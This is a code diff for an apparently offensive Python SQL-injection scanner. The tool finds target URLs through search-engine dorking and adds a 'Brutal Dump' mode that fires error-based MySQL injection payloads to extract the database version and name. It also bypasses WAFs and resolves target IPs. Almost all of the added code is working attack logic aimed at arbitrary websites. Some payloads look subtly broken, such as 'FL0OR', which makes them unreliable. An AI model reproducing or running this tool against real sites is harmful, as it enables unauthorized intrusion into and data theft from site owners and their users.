@@ -1,12 +1,16 @@
 
 
+# This program is a 'total' free software: you can redistribute it and/or modify - ViraX
+# You can quoted me as a source.
 
 import os
 import sys
 import requests
 import time
+import socket
 from random import randint
 from termcolor import colored
+
 
 
 def     block_cutter (string, int_start, int_end):
@@ -42,6 +46,35 @@ def     focpa (url, param):
         i += 1
 
     return -1
+
+
+def     parserDump (data, mod):
+    i = 0
+    ca = 0
+    cb = 0
+    data_list = []
+    
+    while (i < len(data)-1):
+        if (data[i] == '(' and data[i+1] == '^' and data[i+2] == '#'):
+            i += 5
+            ca = i
+            while (i < len(data)-2 and (data[i] != '(' and data[i+2] != '#')):
+                if (i == data.find("' for key")):
+                    break
+                if (data[i] == '<'):
+                    break
+                i += 1
+            i -= 1
+            cb = i
+            tmp = block_cutter(data, ca, cb)
+            data_list.append(tmp)
+                
+            #print colored(" "+tmp, 'yellow')
+            if (mod == 1):
+                return data_list
+        i += 1
+
+    return data_list
 
 
 
@@ -235,7 +268,7 @@ def     sbws (string):
 
 
 
-def     myParserSQLE (url, forcing, timeout):
+def     myParserSQLE (url, forcing, timeout, inject):
     
         lvl = 0
         terms_found = []
@@ -244,11 +277,15 @@ def     myParserSQLE (url, forcing, timeout):
         burl = ""
         nurl = ""
         data = ""
-        waf = 0 
+        waf = 0
+        fo = 0
+        tmp_version = ""
+        tmp_ndatabase = ""
+        payload= ""
 
         user_agent = rand_agent()
         headers = {'User-Agent': user_agent}
-    
+
         wb_req = type(requests)
 
         try:
@@ -256,6 +293,7 @@ def     myParserSQLE (url, forcing, timeout):
             #ForcingOpt
             if (forcing != '' and url.find(forcing) > -1 and focpa(url, forcing) != -1):
                 print colored(" [!] Forcing - stress URL", 'cyan')
+                fo = 1
                 forcing = str(forcing)
                 burl = focpa(url, forcing)
                 nurl = burl
@@ -296,12 +334,124 @@ def     myParserSQLE (url, forcing, timeout):
                     print colored(" [!] this technique is potentially feasible - UNION-BASED -  ", 'green')
                     print colored(" [*] Error potential : Unknown column in 'order clause', mysql_num_rows():, mysql_num_row():, Others errors...", 'cyan')
                     lvl += 10
+                
+            if (inject != '' and url.find(inject) > -1 and focpa(url, inject) != -1):
+                print colored(" [!] Brutal Dump", 'cyan')
+                inject = str(inject)
+                burl = focpa(url, inject)
+                if (fo == 0):
+                    nurl = burl
+                    nurl += "1984 AND CONCAT(CHAR(088,071,068,079,082,075,013,010))"
+                    if (timeout > 0.0):
+                        req = requests.get(nurl, headers=headers, timeout=timeout)
+                    else:
+                        req = requests.get(nurl, headers=headers)
+                        data = req.text.encode('utf-8')
+                        if (data.find("Mod_Security") > -1 or data.find("You don't have permission ") > -1):
+                            print colored(" [!] simple WAF Detected ! Others potential security ... ", 'red')
+                            waf = 1
+
+                nurl = burl
+                nurl += "1 OR 1984 GROUP BY CONCAT(0x28,0x5e,0x23,0x5e,0x29,version(),0x28,0x56,0x23,0x56,0x29,floor(rand(0)*2)) HAVING MIN(0) OR 1 --"
+                if (waf == 1):
+                    nurl = sbws(nurl)
+                if (timeout > 0.0):
+                    req = requests.get(url, headers=headers, timeout=timeout)
+                else:
+                    req = requests.get(url, headers=headers)
+                data = req.text.encode('utf-8')
+                if (data.find("(^#^)") == -1):
+                    nurl = burl
+                    nurl += "1 OR (SELECT 1984 FROM (SELECT COUNT(*),CONCAT(0x28,0x5e,0x23,0x5e,0x29,version(),0x28,0x56,0x23,0x56,0x29,(SELECT(ELT(1984=1984,1))),FL0OR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) --"
+                    if (waf == 1):
+                        nurl = sbws(nurl)
+                    if (timeout > 0.0):
+                        req = requests.get(nurl, headers=headers, timeout=timeout)
+                    else:
+                        req = requests.get(nurl, headers=headers)
+                    data = req.text.encode('utf-8')
+                    if (data.find("(^#^)") == -1):
+                        nurl = burl
+                        nurl += "1 OR (SELECT 1984 FROM (SELECT COUNT(*),CONCAT(0x28,0x5e,0x23,0x5e,0x29,version(),0x28,0x56,0x23,0x56,0x29,CEILING(RAND(0)*CONVERT(2,BINARY)))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) --"
+                        if (waf == 1):
+                            nurl = sbws(nurl)
+                        if (timeout > 0.0):
+                            req = requests.get(nurl, headers=headers, timeout=timeout)
+                        else:
+                            req = requests.get(nurl, headers=headers)
+                        data = req.text.encode('utf-8')
+
+                        tmp_version = str(parserDump(data, 1))
+                        tmp_version = tmp_version.replace('[', '').replace(']', '').replace("'", '')
+                            
+                        nurl = burl
+                        nurl += "1 OR (SELECT 1984 FROM (SELECT COUNT(*),CONCAT(0x28,0x5e,0x23,0x5e,0x29,database(),0x28,0x56,0x23,0x56,0x29,CEILING(RAND(0)*CONVERT(2,BINARY)))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) --"
+                        if (waf == 1):
+                            nurl = sbws(nurl)
+                        if (timeout > 0.0):
+                            req = requests.get(nurl, headers=headers, timeout=timeout)
+                        else:
+                            req = requests.get(nurl, headers=headers)
+                        data = req.text.encode('utf-8')
+                        
+                        tmp_ndatabase = str(parserDump(data, 1))
+                        tmp_ndatabase = tmp_ndatabase.replace('[', '').replace(']', '').replace("'", '')
+                        payload = nurl                     
+
+                    else:
+                        tmp_version = str(parserDump(data, 1))
+                        tmp_version = tmp_version.replace('[', '').replace(']', '').replace("'", '')
+                        
+                        nurl = burl
+                        nurl += "1 OR (SELECT 1984 FROM (SELECT COUNT(*),CONCAT(0x28,0x5e,0x23,0x5e,0x29,database(),0x28,0x56,0x23,0x56,0x29,(SELECT(ELT(1984=1984,1))),FL0OR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) --"
+                        if (waf == 1):
+                            nurl = sbws(nurl)
+                        if (timeout > 0.0):
+                            req = requests.get(nurl, headers=headers, timeout=timeout)
+                        else:
+                            req = requests.get(nurl, headers=headers)
+                        data = req.text.encode('utf-8')
+
+                        tmp_ndatabase = str(parserDump(data, 1))
+                        tmp_ndatabase = tmp_ndatabase.replace('[', '').replace(']', '').replace("'", '')
+                        payload = nurl
+
+                else:
+                    tmp_version = str(parserDump(data, 1))
+                    tmp_version = tmp_version.replace('[', '').replace(']', '').replace("'", '')
+                    
+                    nurl = burl
+                    nurl += "1 OR 1984 GROUP BY CONCAT(0x28,0x5e,0x23,0x5e,0x29,database(),0x28,0x56,0x23,0x56,0x29,floor(rand(0)*2)) HAVING MIN(0) OR 1 --"
+                    if (waf == 1):
+                        nurl = sbws(nurl)
+                    if (timeout > 0.0):
+                        req = requests.get(nurl, headers=headers, timeout=timeout)
+                    else:
+                        req = requests.get(nurl, headers=headers)
+                    data = req.text.encode('utf-8')
+
+                    tmp_ndatabase = str(parserDump(data, 1))
+                    tmp_ndatabase = tmp_ndatabase.replace('[', '').replace(']', '').replace("'", '')
+                    payload = nurl
+
+                if (tmp_version == '' and tmp_ndatabase == ''):
+                    #print colored(" [-] Brutality not work ")
+                    pass
+                else:
+                    print colored(" [*] Infos obtained brutally: ", 'green')
+                    print colored("  - [Version] "+tmp_version, 'yellow')
+                    print colored("  - [Database] "+tmp_ndatabase, 'yellow')
+                    print colored("  - [Payload] "+payload, 'yellow')
+                    lvl += 10
+
 
             if (timeout > 0.0):
                 wb_req = requests.get(url, headers=headers, timeout=timeout)
             else:
                 wb_req = requests.get(url, headers=headers)
             data = wb_req.text.encode('utf-8')
+            
+
 
             #SFind
             if (data.find('MySQL') > -1):
@@ -405,7 +555,7 @@ def     myParserSQLE (url, forcing, timeout):
                 nterms += 1
                 lvl == 1
             if (data.find('argument should be an array in') > -1):
-                terms_found.append('argument should be an rray in')
+                terms_found.append('argument should be an array in')
                 nterms += 1
                 lvl += 4
             if (data.find(' expects parameter 1 to be resource, boolean given in ') > -1):
@@ -449,7 +599,7 @@ def     myParserSQLE (url, forcing, timeout):
                 return lvl
             elif (lvl > 14):
                 print colored(" [!] Vulnerable [!] ", 'green')
-                print colored("     Parser Lvl : "+str(lvl)+" - Legendary *Critical+", 'green')
+                print colored("     Parser Lvl : "+str(lvl)+" - Legendary *Critical+", 'cyan')
                 print colored("     Term(s) overview : <"+str(nterms)+"> "+str(terms_found).replace(',', ' <-> '), 'green')
                 return lvl
             else :
@@ -469,16 +619,35 @@ def     myParserSQLE (url, forcing, timeout):
     
 
 
-def     marvin_ppa (url, out_file, forcing, timeout):
+def     marvin_ppa (url, out_file, forcing, timeout, inject, mores):
         
+        i = 0
+        c = 0
+        surl = ""
+        port = 80
         print colored("\n [Marvin Ppa] work on "+url, 'blue')
-        
+        if (mores == 1):
+            while (i < len(url) and url[i] != ""):
+                if (url[i] == '/' and i > 12):
+                    break
+                i += 1
+            c = i-1
+            if (url.find("http") > -1):
+                surl = block_cutter(url, 7, c)
+            elif (url.find("https") > -1):
+                surl = block_cutter(url, 8, c)
+            tsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            tsock.connect((surl, port))
+            minfos = tsock.getpeername()[0]
+            tsock.close()
+            print colored(" [!] IP Overview: "+str(minfos), 'green')
+
         qurl = url+"%%2727"
         if (url.find('search.php?search_id=') > -1):
             qurl = block_cutter(url, 0, (url.find('search.php?search_id=')+len("search.php?search_id=")-1))
             qurl += "1%%2727"
     
-        if (myParserSQLE (qurl, forcing, timeout) > 0):
+        if (myParserSQLE (qurl, forcing, timeout, inject) > 0):
             dump = open(out_file, 'a')
             dump.write(url+"\n")
             dump.close()
@@ -487,25 +656,28 @@ def     marvin_ppa (url, out_file, forcing, timeout):
             return 0
 
 
-
-def     moulinette (urls, out_file, forcing, timeout):
+def     moulinette (urls, out_file, forcing, timeout, inject, mores):
 
         i = 0
         n = 0
         stress = 0
+        
         while (i < len(urls)):
-            stress = marvin_ppa (urls[i], out_file, forcing, timeout)
+            #signal.signal(signal.SIGINT, signal_handler)
+            stress = marvin_ppa (urls[i], out_file, forcing, timeout, inject, mores)
+            #signal.pause()
             if (stress == 1):
                 n += 1
             i += 1
+
         return n
 
 
 
-def     search_engine (dork, n_page, out_file, bp, cdom, forcing, timeout):
+def     search_engine (dork, n_page, out_file, bp, cdom, forcing, timeout, inject, mores):
 
         IP_PO = ipuser()
-        print colored(" [*] Public IP overview: "+IP_PO+"\n", 'blue')
+        print colored("\n [*] Public IP overview: "+IP_PO+"", 'blue')
 
         su_filter = ""
         urls_found = []
@@ -580,7 +752,7 @@ def     search_engine (dork, n_page, out_file, bp, cdom, forcing, timeout):
             user_agent = rand_agent()
             headers = {'User-Agent': user_agent}
             
-            print colored("\n [<S "+str(i)+"-"+str(g_page)+">] ", 'cyan')
+            print colored("\n [<Serial "+str(i+1)+">] ", 'cyan')
             print colored(" [+] User-Agent: "+user_agent, 'green')
 
             if (bp > 0):
@@ -628,8 +800,8 @@ def     search_engine (dork, n_page, out_file, bp, cdom, forcing, timeout):
 
         if ((len(urls_found)-1) > 0):
             print colored("\n [*] GSE Crawling finished, Marvin Ppa > \n", 'cyan')
-            nbr = moulinette (urls_found, out_file, forcing, timeout)
-            print colored("\n [!] URLs Saved: "+str(nbr)+" in '"+out_file+"' !", 'green')
+            nbr = moulinette (urls_found, out_file, forcing, timeout, inject, mores)
+            print colored("\n\n [!] URLs Saved: "+str(nbr)+" in '"+out_file+"' !", 'green')
             print colored(" [*] Verify if is not fake positive ! ... \n\n", 'red')
 
         else:
